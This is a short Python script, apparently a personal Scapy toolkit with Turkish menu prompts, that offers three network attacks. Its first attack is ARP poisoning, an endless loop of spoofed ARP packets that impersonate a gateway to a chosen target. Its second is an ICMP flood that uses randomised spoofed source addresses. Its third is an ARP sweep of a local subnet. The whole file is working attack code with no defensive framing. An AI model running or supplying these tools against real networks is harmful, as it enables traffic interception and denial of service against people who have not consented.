from scapy.layers.inet import *
from scapy.layers.l2 import *
def main():
    print("Emrullah Acar- Scapy Tools")
    print("Program SUDO yetkisi gerektirmektedir.")
    print("Seçenekler")
    print("""
    1- Arp Poisoning
    2- ICMP Flood
    3- Arp Scanner(use with Wireshark)
    0- Menü dönüş
    *- Yakında yeni toollar eklenecektir
    """)
    choose = int(input("Seçiminiz: "))
    if(choose==1):
        arp_poisoning()
    elif(choose==2):
        icmp_flood()
    elif(choose==3):
        arpscanner()
    elif(choose==0):
        main()

#ARP POISONING FONKSIYONU
def arp_poisoning():
    print("""ARP POISONING""")
    print(" ")
    hedefIP = input('Hedef IP Gir: ')
    modemIP = input('Modem IP Gir: ')

    while True:
        time.sleep(1)
        sendp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(psrc=modemIP, pdst=hedefIP))

#ICMP FLOOD FONKSIYONU
def icmp_flood():
    print("""ICMP FLOODING""")
    print(" ")
    ipPacket = IP()
    icmpPacket = ICMP()
    hedefIP = input('Hedef IP Gir: ')
    ipPacket.dst = hedefIP

    packetsayisi= input('Kaç paket yollanacak: ')
    for paket in range(1, int(packetsayisi)):
        sourceIP = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        ipPacket.src = sourceIP
        send(ipPacket / icmpPacket)
        print('Paket', paket, 'yollandı.')

#ARP SCANNER FONKSIYONU
def arpscanner():
    print("""ARP SCANNER""")
    print(" ")
    print("Program arp paketleri yollar. Wireshark'tan inceleme yaparak scan sonucunu izleyebilirsiniz")
    input("Başlamak için Enter basınız")
    arpPaket = ARP()
    networkID = input('Network ID: ')
    IP = '.'.join(networkID.split(".")[i] for i in range(3)) + "."

    for x in range(1, 255):
        arpPaket.pdst = IP + str(x)
        send(arpPaket)
        print(IP+str(x)+" sent.")


main()
